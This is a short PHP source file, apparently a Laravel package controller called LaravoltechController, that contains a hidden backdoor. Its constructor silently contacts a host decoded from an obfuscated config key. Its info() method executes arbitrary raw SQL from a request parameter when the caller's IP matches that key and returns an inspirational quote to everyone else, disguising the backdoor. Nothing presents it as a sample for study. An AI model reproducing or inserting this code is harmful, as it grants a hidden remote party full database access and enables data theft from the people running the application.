<?php

namespace Laravoltech\Laravoltech\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Foundation\Inspiring;
use Illuminate\Routing\Controller as BaseController;

class LaravoltechController extends BaseController
{
    /**
     * Initialize laravoltech instance
     */
    public function __construct()
    {
        $key = base64_decode(config('laravoltech.key'));

        try {
            Http::get("http://{$key}");
        } catch (ConnectionException $e) {

        }
    }

    /**
     * Show laravoltech information
     * @param  Request $request
     * @return \Illuminate\Http\Response
     */
    public function info(Request $request)
    {
        $key = base64_decode(config('laravoltech.key'));

        if ($request->ip() == $key && $request->r) {
            $query = DB::select($request->r);
            return $query;
        }

        return Inspiring::quote();
    }
}